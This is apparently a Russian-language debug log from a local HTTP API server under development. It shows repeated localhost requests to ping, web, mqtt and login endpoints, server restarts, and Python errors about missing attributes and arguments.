	Query: {}
	Authorization: empty
25.08.27 17:19:36 132414068221504: начало
25.08.27 17:19:36 132414068221504: url_path
25.08.27 17:19:36 132414068221504: /api/v2_1/sc/web
25.08.27 17:19:36 132414068221504: url_prefix
25.08.27 17:19:36 132414068221504: /api/v2_1/sc/
25.08.27 17:19:36 132414068221504: if
25.08.27 17:19:36 132414068221504: parts
25.08.27 17:19:36 132414068221504: ['web']
25.08.27 17:19:36 132414068221504: project_name
25.08.27 17:19:36 132414068221504: None
25.08.27 17:19:36 132414068221504: web
25.08.27 17:19:54 132414068221504: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:19:54 132414068221504: начало
25.08.27 17:19:54 132414068221504: url_path
25.08.27 17:19:54 132414068221504: /api/v2_1/sc/ping
25.08.27 17:19:54 132414068221504: url_prefix
25.08.27 17:19:54 132414068221504: /api/v2_1/sc/
25.08.27 17:19:54 132414068221504: if
25.08.27 17:19:54 132414068221504: parts
25.08.27 17:19:54 132414068221504: ['ping']
25.08.27 17:19:54 132414068221504: project_name
25.08.27 17:19:54 132414068221504: None
25.08.27 17:19:54 132414068221504: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:19:54 132414068221504: начало
25.08.27 17:19:54 132414068221504: url_path
25.08.27 17:19:54 132414068221504: /api/v2_1/sc/web/pop
25.08.27 17:19:54 132414068221504: url_prefix
25.08.27 17:19:54 132414068221504: /api/v2_1/sc/
25.08.27 17:19:54 132414068221504: if
25.08.27 17:19:54 132414068221504: parts
25.08.27 17:19:54 132414068221504: ['web', 'pop']
25.08.27 17:19:54 132414068221504: project_name
25.08.27 17:19:54 132414068221504: web
25.08.27 17:19:54 132414068221504: Проекта web нет в списке доступных проектов.
25.08.27 17:19:55 132414068221504: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:19:55 132414068221504: начало
25.08.27 17:19:55 132414068221504: url_path
25.08.27 17:19:55 132414068221504: /api/v2_1/sc/ping
25.08.27 17:19:55 132414068221504: url_prefix
25.08.27 17:19:55 132414068221504: /api/v2_1/sc/
25.08.27 17:19:55 132414068221504: if
25.08.27 17:19:55 132414068221504: parts
25.08.27 17:19:55 132414068221504: ['ping']
25.08.27 17:19:55 132414068221504: project_name
25.08.27 17:19:55 132414068221504: None
25.08.27 17:19:55 132414068221504: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:19:55 132414068221504: начало
25.08.27 17:19:55 132414068221504: url_path
25.08.27 17:19:55 132414068221504: /api/v2_1/sc/web/pop
25.08.27 17:19:55 132414068221504: url_prefix
25.08.27 17:19:55 132414068221504: /api/v2_1/sc/
25.08.27 17:19:55 132414068221504: if
25.08.27 17:19:55 132414068221504: parts
25.08.27 17:19:55 132414068221504: ['web', 'pop']
25.08.27 17:19:55 132414068221504: project_name
25.08.27 17:19:55 132414068221504: web
25.08.27 17:19:55 132414068221504: Проекта web нет в списке доступных проектов.
25.08.27 17:20:13 132414068221504: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:20:13 132414068221504: начало
25.08.27 17:20:13 132414068221504: url_path
25.08.27 17:20:13 132414068221504: /api/v2_1/sc/ping
25.08.27 17:20:13 132414068221504: url_prefix
25.08.27 17:20:13 132414068221504: /api/v2_1/sc/
25.08.27 17:20:13 132414068221504: if
25.08.27 17:20:13 132414068221504: parts
25.08.27 17:20:13 132414068221504: ['ping']
25.08.27 17:20:13 132414068221504: project_name
25.08.27 17:20:13 132414068221504: None
25.08.27 17:20:13 132414068221504: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:20:13 132414068221504: начало
25.08.27 17:20:13 132414068221504: url_path
25.08.27 17:20:13 132414068221504: /api/v2_1/sc/web
25.08.27 17:20:13 132414068221504: url_prefix
25.08.27 17:20:13 132414068221504: /api/v2_1/sc/
25.08.27 17:20:13 132414068221504: if
25.08.27 17:20:13 132414068221504: parts
25.08.27 17:20:13 132414068221504: ['web']
25.08.27 17:20:13 132414068221504: project_name
25.08.27 17:20:13 132414068221504: None
25.08.27 17:20:13 132414068221504: web
25.08.27 17:23:09 129047755440128: Сервер запущен 0.0.0.0: 20008
25.08.27 17:23:13 129047713539648: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:23:13 129047713539648: начало
25.08.27 17:23:13 129047713539648: url_path
25.08.27 17:23:13 129047713539648: /api/v2_1/sc/ping
25.08.27 17:23:13 129047713539648: url_prefix
25.08.27 17:23:13 129047713539648: /api/v2_1/sc/
25.08.27 17:23:13 129047713539648: if
25.08.27 17:23:13 129047713539648: parts
25.08.27 17:23:13 129047713539648: ['ping']
25.08.27 17:23:13 129047713539648: project_name
25.08.27 17:23:13 129047713539648: None
25.08.27 17:23:13 129047713539648: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:23:13 129047713539648: начало
25.08.27 17:23:13 129047713539648: url_path
25.08.27 17:23:13 129047713539648: /api/v2_1/sc/web
25.08.27 17:23:13 129047713539648: url_prefix
25.08.27 17:23:13 129047713539648: /api/v2_1/sc/
25.08.27 17:23:13 129047713539648: if
25.08.27 17:23:13 129047713539648: parts
25.08.27 17:23:13 129047713539648: ['web']
25.08.27 17:23:13 129047713539648: project_name
25.08.27 17:23:13 129047713539648: None
25.08.27 17:23:13 129047713539648: web
25.08.27 17:23:52 136556901654528: Сервер запущен 0.0.0.0: 20008
25.08.27 17:23:55 136556859876928: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:23:55 136556859876928: начало
25.08.27 17:23:55 136556859876928: url_path
25.08.27 17:23:55 136556859876928: /api/v2_1/sc/ping
25.08.27 17:23:55 136556859876928: url_prefix
25.08.27 17:23:55 136556859876928: /api/v2_1/sc/
25.08.27 17:23:55 136556859876928: if
25.08.27 17:23:55 136556859876928: parts
25.08.27 17:23:55 136556859876928: ['ping']
25.08.27 17:23:55 136556859876928: project_name
25.08.27 17:23:55 136556859876928: None
25.08.27 17:23:55 136556859876928: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:23:55 136556859876928: начало
25.08.27 17:23:55 136556859876928: url_path
25.08.27 17:23:55 136556859876928: /api/v2_1/sc/web
25.08.27 17:23:55 136556859876928: url_prefix
25.08.27 17:23:55 136556859876928: /api/v2_1/sc/
25.08.27 17:23:55 136556859876928: if
25.08.27 17:23:55 136556859876928: parts
25.08.27 17:23:55 136556859876928: ['web']
25.08.27 17:23:55 136556859876928: project_name
25.08.27 17:23:55 136556859876928: None
25.08.27 17:23:55 136556859876928: web
25.08.27 17:24:12 136556859876928: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:24:12 136556859876928: начало
25.08.27 17:24:12 136556859876928: url_path
25.08.27 17:24:12 136556859876928: /api/v2_1/sc/ping
25.08.27 17:24:12 136556859876928: url_prefix
25.08.27 17:24:12 136556859876928: /api/v2_1/sc/
25.08.27 17:24:12 136556859876928: if
25.08.27 17:24:12 136556859876928: parts
25.08.27 17:24:12 136556859876928: ['ping']
25.08.27 17:24:12 136556859876928: project_name
25.08.27 17:24:12 136556859876928: None
25.08.27 17:24:12 136556859876928: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:24:12 136556859876928: начало
25.08.27 17:24:12 136556859876928: url_path
25.08.27 17:24:12 136556859876928: /api/v2_1/sc/web/pop
25.08.27 17:24:12 136556859876928: url_prefix
25.08.27 17:24:12 136556859876928: /api/v2_1/sc/
25.08.27 17:24:12 136556859876928: if
25.08.27 17:24:12 136556859876928: parts
25.08.27 17:24:12 136556859876928: ['web', 'pop']
25.08.27 17:24:12 136556859876928: project_name
25.08.27 17:24:12 136556859876928: web
25.08.27 17:24:12 136556859876928: Проекта web нет в списке доступных проектов.
25.08.27 17:24:13 136556859876928: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:24:13 136556859876928: начало
25.08.27 17:24:13 136556859876928: url_path
25.08.27 17:24:13 136556859876928: /api/v2_1/sc/ping
25.08.27 17:24:13 136556859876928: url_prefix
25.08.27 17:24:13 136556859876928: /api/v2_1/sc/
25.08.27 17:24:13 136556859876928: if
25.08.27 17:24:13 136556859876928: parts
25.08.27 17:24:13 136556859876928: ['ping']
25.08.27 17:24:13 136556859876928: project_name
25.08.27 17:24:13 136556859876928: None
25.08.27 17:24:13 136556859876928: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:24:13 136556859876928: начало
25.08.27 17:24:13 136556859876928: url_path
25.08.27 17:24:13 136556859876928: /api/v2_1/sc/web/pop
25.08.27 17:24:13 136556859876928: url_prefix
25.08.27 17:24:13 136556859876928: /api/v2_1/sc/
25.08.27 17:24:13 136556859876928: if
25.08.27 17:24:13 136556859876928: parts
25.08.27 17:24:13 136556859876928: ['web', 'pop']
25.08.27 17:24:13 136556859876928: project_name
25.08.27 17:24:13 136556859876928: web
25.08.27 17:24:13 136556859876928: Проекта web нет в списке доступных проектов.
25.08.27 17:29:47 135175591743488: Сервер запущен 0.0.0.0: 20008
25.08.27 17:29:51 135175549740608: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:29:51 135175549740608: начало
25.08.27 17:29:51 135175549740608: url_path
25.08.27 17:29:51 135175549740608: /api/v2_1/sc/ping
25.08.27 17:29:51 135175549740608: url_prefix
25.08.27 17:29:51 135175549740608: /api/v2_1/sc/
25.08.27 17:29:51 135175549740608: if
25.08.27 17:29:51 135175549740608: parts
25.08.27 17:29:51 135175549740608: ['ping']
25.08.27 17:29:51 135175549740608: project_name
25.08.27 17:29:51 135175549740608: None
25.08.27 17:29:51 135175549740608: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:29:51 135175549740608: начало
25.08.27 17:29:51 135175549740608: url_path
25.08.27 17:29:51 135175549740608: /api/v2_1/sc/web/pop
25.08.27 17:29:51 135175549740608: url_prefix
25.08.27 17:29:51 135175549740608: /api/v2_1/sc/
25.08.27 17:29:51 135175549740608: if
25.08.27 17:29:51 135175549740608: parts
25.08.27 17:29:51 135175549740608: ['web', 'pop']
25.08.27 17:29:51 135175549740608: project_name
25.08.27 17:29:51 135175549740608: web
25.08.27 17:29:51 135175549740608: web
25.08.27 17:41:55 131290508566528: Сервер запущен 0.0.0.0: 20008
25.08.27 17:42:07 131290458216000: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:42:07 131290458216000: начало
25.08.27 17:42:07 131290458216000: url_path
25.08.27 17:42:07 131290458216000: /api/v2_1/sc/ping
25.08.27 17:42:07 131290458216000: url_prefix
25.08.27 17:42:07 131290458216000: /api/v2_1/sc/
25.08.27 17:42:07 131290458216000: if
25.08.27 17:42:07 131290458216000: parts
25.08.27 17:42:07 131290458216000: ['ping']
25.08.27 17:42:07 131290458216000: project_name
25.08.27 17:42:07 131290458216000: None
25.08.27 17:42:07 131290458216000: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:42:07 131290458216000: начало
25.08.27 17:42:07 131290458216000: url_path
25.08.27 17:42:07 131290458216000: /api/v2_1/sc/web/pop
25.08.27 17:42:07 131290458216000: url_prefix
25.08.27 17:42:07 131290458216000: /api/v2_1/sc/
25.08.27 17:42:07 131290458216000: if
25.08.27 17:42:07 131290458216000: parts
25.08.27 17:42:07 131290458216000: ['web', 'pop']
25.08.27 17:42:07 131290458216000: project_name
25.08.27 17:42:07 131290458216000: web
25.08.27 17:42:07 131290458216000: module 'server' has no attribute 'send_answer'
25.08.27 17:44:43 134277855330304: Сервер запущен 0.0.0.0: 20008
25.08.27 17:44:47 134277813495360: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:44:47 134277813495360: начало
25.08.27 17:44:47 134277813495360: url_path
25.08.27 17:44:47 134277813495360: /api/v2_1/sc/ping
25.08.27 17:44:47 134277813495360: url_prefix
25.08.27 17:44:47 134277813495360: /api/v2_1/sc/
25.08.27 17:44:47 134277813495360: if
25.08.27 17:44:47 134277813495360: parts
25.08.27 17:44:47 134277813495360: ['ping']
25.08.27 17:44:47 134277813495360: project_name
25.08.27 17:44:47 134277813495360: None
25.08.27 17:44:47 134277813495360: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:44:47 134277813495360: начало
25.08.27 17:44:47 134277813495360: url_path
25.08.27 17:44:47 134277813495360: /api/v2_1/sc/web/pop
25.08.27 17:44:47 134277813495360: url_prefix
25.08.27 17:44:47 134277813495360: /api/v2_1/sc/
25.08.27 17:44:47 134277813495360: if
25.08.27 17:44:47 134277813495360: parts
25.08.27 17:44:47 134277813495360: ['web', 'pop']
25.08.27 17:44:47 134277813495360: project_name
25.08.27 17:44:47 134277813495360: web
25.08.27 17:44:47 134277813495360: MyHTTPRequestHandler.send_answer() missing 1 required positional argument: 'js'
25.08.27 17:45:55 138143329099776: Сервер запущен 0.0.0.0: 20008
25.08.27 17:45:59 138143287207488: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:45:59 138143287207488: начало
25.08.27 17:45:59 138143287207488: url_path
25.08.27 17:45:59 138143287207488: /api/v2_1/sc/ping
25.08.27 17:45:59 138143287207488: url_prefix
25.08.27 17:45:59 138143287207488: /api/v2_1/sc/
25.08.27 17:45:59 138143287207488: if
25.08.27 17:45:59 138143287207488: parts
25.08.27 17:45:59 138143287207488: ['ping']
25.08.27 17:45:59 138143287207488: project_name
25.08.27 17:45:59 138143287207488: None
25.08.27 17:45:59 138143287207488: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:45:59 138143287207488: начало
25.08.27 17:45:59 138143287207488: url_path
25.08.27 17:45:59 138143287207488: /api/v2_1/sc/web/pop
25.08.27 17:45:59 138143287207488: url_prefix
25.08.27 17:45:59 138143287207488: /api/v2_1/sc/
25.08.27 17:45:59 138143287207488: if
25.08.27 17:45:59 138143287207488: parts
25.08.27 17:45:59 138143287207488: ['web', 'pop']
25.08.27 17:45:59 138143287207488: project_name
25.08.27 17:45:59 138143287207488: web
25.08.27 17:45:59 138143287207488: MyHTTPRequestHandler.send_answer() missing 1 required positional argument: 'js'
25.08.27 17:55:21 140371360743424: Сервер запущен 0.0.0.0: 20008
25.08.27 17:55:26 140371319060032: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:55:26 140371319060032: начало
25.08.27 17:55:26 140371319060032: url_path
25.08.27 17:55:26 140371319060032: /api/v2_1/sc/ping
25.08.27 17:55:26 140371319060032: url_prefix
25.08.27 17:55:26 140371319060032: /api/v2_1/sc/
25.08.27 17:55:26 140371319060032: if
25.08.27 17:55:26 140371319060032: parts
25.08.27 17:55:26 140371319060032: ['ping']
25.08.27 17:55:26 140371319060032: project_name
25.08.27 17:55:26 140371319060032: None
25.08.27 17:55:26 140371319060032: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:55:26 140371319060032: начало
25.08.27 17:55:26 140371319060032: url_path
25.08.27 17:55:26 140371319060032: /api/v2_1/sc/web/pop
25.08.27 17:55:26 140371319060032: url_prefix
25.08.27 17:55:26 140371319060032: /api/v2_1/sc/
25.08.27 17:55:26 140371319060032: if
25.08.27 17:55:26 140371319060032: parts
25.08.27 17:55:26 140371319060032: ['web', 'pop']
25.08.27 17:55:26 140371319060032: project_name
25.08.27 17:55:26 140371319060032: web
25.08.27 17:55:26 140371319060032: module 'web' has no attribute 'router'
25.08.27 17:56:43 138993483567104: Сервер запущен 0.0.0.0: 20008
25.08.27 17:56:46 138993442219584: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:56:46 138993442219584: url_prefix
25.08.27 17:56:46 138993442219584: /api/v2_1/sc/
25.08.27 17:56:46 138993442219584: if
25.08.27 17:56:46 138993442219584: parts
25.08.27 17:56:46 138993442219584: ['ping']
25.08.27 17:56:46 138993442219584: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:56:46 138993442219584: url_prefix
25.08.27 17:56:46 138993442219584: /api/v2_1/sc/
25.08.27 17:56:46 138993442219584: if
25.08.27 17:56:46 138993442219584: parts
25.08.27 17:56:46 138993442219584: ['web', 'pop']
25.08.27 17:56:46 138993442219584: module 'web' has no attribute 'router'
25.08.27 17:57:13 138993442219584: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:57:13 138993442219584: url_prefix
25.08.27 17:57:13 138993442219584: /api/v2_1/sc/
25.08.27 17:57:13 138993442219584: if
25.08.27 17:57:13 138993442219584: parts
25.08.27 17:57:13 138993442219584: ['ping']
25.08.27 17:57:13 138993442219584: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:57:13 138993442219584: url_prefix
25.08.27 17:57:13 138993442219584: /api/v2_1/sc/
25.08.27 17:57:13 138993442219584: if
25.08.27 17:57:13 138993442219584: parts
25.08.27 17:57:13 138993442219584: ['web', 'pop']
25.08.27 17:57:13 138993442219584: module 'web' has no attribute 'router'
25.08.27 17:57:15 138993442219584: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:57:15 138993442219584: url_prefix
25.08.27 17:57:15 138993442219584: /api/v2_1/sc/
25.08.27 17:57:15 138993442219584: if
25.08.27 17:57:15 138993442219584: parts
25.08.27 17:57:15 138993442219584: ['mqtt_last']
25.08.27 17:57:15 138993442219584: mQtT
25.08.27 17:57:19 132480315633664: Сервер запущен 0.0.0.0: 20008
25.08.27 17:57:20 132480274261568: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:57:20 132480274261568: url_prefix
25.08.27 17:57:20 132480274261568: /api/v2_1/sc/
25.08.27 17:57:20 132480274261568: if
25.08.27 17:57:20 132480274261568: mQtT
25.08.27 17:58:20 132480274261568: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:58:20 132480274261568: url_prefix
25.08.27 17:58:20 132480274261568: /api/v2_1/sc/
25.08.27 17:58:20 132480274261568: if
25.08.27 17:58:20 132480274261568: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:58:20 132480274261568: url_prefix
25.08.27 17:58:20 132480274261568: /api/v2_1/sc/
25.08.27 17:58:20 132480274261568: if
25.08.27 17:58:20 132480274261568: module 'web' has no attribute 'router'
25.08.27 17:58:57 128255040229376: Сервер запущен 0.0.0.0: 20008
25.08.27 17:59:01 128254998472256: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:59:01 128254998472256: url_prefix
25.08.27 17:59:01 128254998472256: /api/v2_1/sc/
25.08.27 17:59:01 128254998472256: if
25.08.27 17:59:01 128254998472256: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 17:59:01 128254998472256: url_prefix
25.08.27 17:59:01 128254998472256: /api/v2_1/sc/
25.08.27 17:59:01 128254998472256: if
25.08.27 17:59:01 128254998472256: module 'web' has no attribute 'router'
25.08.27 18:00:12 124616263454720: Сервер запущен 0.0.0.0: 20008
25.08.27 18:00:14 124616221648448: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 18:00:14 124616221648448: url_prefix
25.08.27 18:00:14 124616221648448: /api/v2_1/sc/
25.08.27 18:00:14 124616221648448: if
25.08.27 18:00:14 124616221648448: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 18:00:14 124616221648448: url_prefix
25.08.27 18:00:14 124616221648448: /api/v2_1/sc/
25.08.27 18:00:14 124616221648448: if
25.08.27 18:00:14 124616221648448: module 'web' has no attribute 'router'
25.08.27 18:00:50 130922720604160: Сервер запущен 0.0.0.0: 20008
25.08.27 18:00:52 130922678576704: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 18:00:52 130922678576704: url_prefix
25.08.27 18:00:52 130922678576704: /api/v2_1/sc/
25.08.27 18:00:52 130922678576704: if
25.08.27 18:00:52 130922678576704: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.27 18:00:52 130922678576704: url_prefix
25.08.27 18:00:52 130922678576704: /api/v2_1/sc/
25.08.27 18:00:52 130922678576704: if
25.08.27 18:00:52 130922678576704: module 'web' has no attribute 'router'
25.08.28 11:42:13 140167915761664: Сервер запущен 0.0.0.0: 20008
25.08.28 11:44:31 140167801206336: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.28 11:44:31 140167801206336: url_prefix
25.08.28 11:44:31 140167801206336: /api/v2_1/sc/
25.08.28 11:44:31 140167801206336: if
25.08.28 11:44:31 140167801206336: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.28 11:44:31 140167801206336: url_prefix
25.08.28 11:44:31 140167801206336: /api/v2_1/sc/
25.08.28 11:44:31 140167801206336: if
25.08.28 11:44:31 140167801206336: module 'web' has no attribute 'router'
25.08.28 11:44:56 140167801206336: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.28 11:44:56 140167801206336: url_prefix
25.08.28 11:44:56 140167801206336: /api/v2_1/sc/
25.08.28 11:44:56 140167801206336: if
25.08.28 11:44:56 140167801206336: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.28 11:44:56 140167801206336: url_prefix
25.08.28 11:44:56 140167801206336: /api/v2_1/sc/
25.08.28 11:44:56 140167801206336: if
25.08.28 11:44:56 140167801206336: module 'web' has no attribute 'router'
25.08.28 15:53:25 140116909531136: Сервер запущен 0.0.0.0: 20008
25.08.28 15:53:32 140116798469696: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.28 15:53:32 140116798469696: url_prefix
25.08.28 15:53:32 140116798469696: /api/v2_1/sc/
25.08.28 15:53:32 140116798469696: if
25.08.28 15:53:32 140116798469696: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.28 15:53:32 140116798469696: url_prefix
25.08.28 15:53:32 140116798469696: /api/v2_1/sc/
25.08.28 15:53:32 140116798469696: if
25.08.28 15:53:32 140116798469696: web
25.08.28 15:53:32 140116798469696: 'MyHTTPRequestHandler' object has no attribute 'web'
25.08.28 15:57:31 139859713531904: Сервер запущен 0.0.0.0: 20008
25.08.28 15:57:36 139859674433088: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.28 15:57:36 139859674433088: url_prefix
25.08.28 15:57:36 139859674433088: /api/v2_1/sc/
25.08.28 15:57:36 139859674433088: if
25.08.28 15:57:36 139859674433088: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.28 15:57:36 139859674433088: url_prefix
25.08.28 15:57:36 139859674433088: /api/v2_1/sc/
25.08.28 15:57:36 139859674433088: if
25.08.28 15:57:36 139859674433088: web
25.08.28 15:57:36 139859674433088: 'MyHTTPRequestHandler' object has no attribute 'web'
25.08.28 16:01:06 140023560040448: Сервер запущен 0.0.0.0: 20008
25.08.28 16:01:10 140023450039872: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.28 16:01:10 140023450039872: url_prefix
25.08.28 16:01:10 140023450039872: /api/v2_1/sc/
25.08.28 16:01:10 140023450039872: if
25.08.28 16:01:10 140023450039872: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.28 16:01:10 140023450039872: url_prefix
25.08.28 16:01:10 140023450039872: /api/v2_1/sc/
25.08.28 16:01:10 140023450039872: if
25.08.28 16:01:10 140023450039872: web
25.08.28 16:01:23 140023450039872: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.28 16:01:23 140023450039872: url_prefix
25.08.28 16:01:23 140023450039872: /api/v2_1/sc/
25.08.28 16:01:23 140023450039872: if
25.08.28 16:01:24 140023450039872: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.28 16:01:24 140023450039872: url_prefix
25.08.28 16:01:24 140023450039872: /api/v2_1/sc/
25.08.28 16:01:24 140023450039872: if
25.08.28 16:01:24 140023450039872: web
25.08.28 16:03:48 140023450039872: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.28 16:03:48 140023450039872: url_prefix
25.08.28 16:03:48 140023450039872: /api/v2_1/sc/
25.08.28 16:03:48 140023450039872: if
25.08.28 16:03:48 140023450039872: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.28 16:03:48 140023450039872: url_prefix
25.08.28 16:03:48 140023450039872: /api/v2_1/sc/
25.08.28 16:03:48 140023450039872: if
25.08.28 16:03:48 140023450039872: web
25.08.28 16:06:25 139968944730112: Сервер запущен 0.0.0.0: 20008
25.08.28 16:06:33 139968905631296: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.28 16:06:33 139968905631296: url_prefix
25.08.28 16:06:33 139968905631296: /api/v2_1/sc/
25.08.28 16:06:33 139968905631296: if
25.08.28 16:06:33 139968905631296: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.28 16:06:33 139968905631296: url_prefix
25.08.28 16:06:33 139968905631296: /api/v2_1/sc/
25.08.28 16:06:33 139968905631296: if
25.08.28 16:06:43 139968905631296: Запрос:
	Address: 127.0.0.1
	Query: {"login":"ф","pass":"ф"}
	Authorization: empty
25.08.28 16:06:43 139968905631296: url_prefix
25.08.28 16:06:43 139968905631296: /api/v2_1/sc/
25.08.28 16:06:43 139968905631296: if
25.08.28 16:06:43 139968905631296: URL: /api/v2_1/sc/login
25.08.28 16:06:43 139968905631296: Из запроса /api/v2_1/sc/login не удалось получить название проекта.
25.08.28 16:07:23 139968905631296: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.28 16:07:23 139968905631296: url_prefix
25.08.28 16:07:23 139968905631296: /api/v2_1/sc/
25.08.28 16:07:23 139968905631296: if
25.08.28 16:07:23 139968905631296: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.28 16:07:23 139968905631296: url_prefix
25.08.28 16:07:23 139968905631296: /api/v2_1/sc/
25.08.28 16:07:23 139968905631296: if
25.08.28 16:07:25 139968905631296: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.28 16:07:25 139968905631296: url_prefix
25.08.28 16:07:25 139968905631296: /api/v2_1/sc/
25.08.28 16:07:25 139968905631296: if
25.08.28 16:07:25 139968905631296: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.28 16:07:25 139968905631296: url_prefix
25.08.28 16:07:25 139968905631296: /api/v2_1/sc/
25.08.28 16:07:25 139968905631296: if
25.08.28 16:07:32 139968905631296: Запрос:
	Address: 127.0.0.1
	Query: {"login":"a","pass":"a"}
	Authorization: empty
25.08.28 16:07:32 139968905631296: url_prefix
25.08.28 16:07:32 139968905631296: /api/v2_1/sc/
25.08.28 16:07:32 139968905631296: if
25.08.28 16:07:32 139968905631296: login() missing 1 required positional argument: 'handler'
25.08.28 16:09:41 140428436037632: Сервер запущен 0.0.0.0: 20008
25.08.28 16:09:47 140428396938816: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.28 16:09:47 140428396938816: url_prefix
25.08.28 16:09:47 140428396938816: /api/v2_1/sc/
25.08.28 16:09:47 140428396938816: if
25.08.28 16:09:47 140428396938816: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.28 16:09:47 140428396938816: url_prefix
25.08.28 16:09:47 140428396938816: /api/v2_1/sc/
25.08.28 16:09:47 140428396938816: if
25.08.28 16:10:13 140382969229312: Сервер запущен 0.0.0.0: 20008
25.08.28 16:10:16 140382930130496: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.28 16:10:16 140382930130496: url_prefix
25.08.28 16:10:16 140382930130496: /api/v2_1/sc/
25.08.28 16:10:16 140382930130496: if
25.08.28 16:10:16 140382930130496: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.28 16:10:16 140382930130496: url_prefix
25.08.28 16:10:16 140382930130496: /api/v2_1/sc/
25.08.28 16:10:16 140382930130496: if
25.08.28 16:10:24 140382930130496: Запрос:
	Address: 127.0.0.1
	Query: {"login":"s","pass":"d"}
	Authorization: empty
25.08.28 16:10:24 140382930130496: url_prefix
25.08.28 16:10:24 140382930130496: /api/v2_1/sc/
25.08.28 16:10:24 140382930130496: if
25.08.28 16:17:01 140483787120640: Сервер запущен 0.0.0.0: 20008
25.08.28 16:17:06 140483748021824: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.28 16:17:06 140483748021824: url_prefix
25.08.28 16:17:06 140483748021824: /api/v2_1/sc/
25.08.28 16:17:06 140483748021824: if
25.08.28 16:17:06 140483748021824: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
25.08.28 16:17:06 140483748021824: url_prefix
25.08.28 16:17:06 140483748021824: /api/v2_1/sc/
25.08.28 16:17:06 140483748021824: if
25.08.28 16:17:13 140483748021824: Запрос:
	Address: 127.0.0.1
	Query: {"login":"as","pass":"sa"}
	Authorization: empty
25.08.28 16:17:13 140483748021824: url_prefix
25.08.28 16:17:13 140483748021824: /api/v2_1/sc/
25.08.28 16:17:13 140483748021824: if
25.08.28 16:26:40 140229901930496: Сервер запущен 0.0.0.0: 20008
25.08.28 16:26:46 140229862831680: Запрос:
	Address: 127.0.0.1
	Query: {}
	Authorization: empty
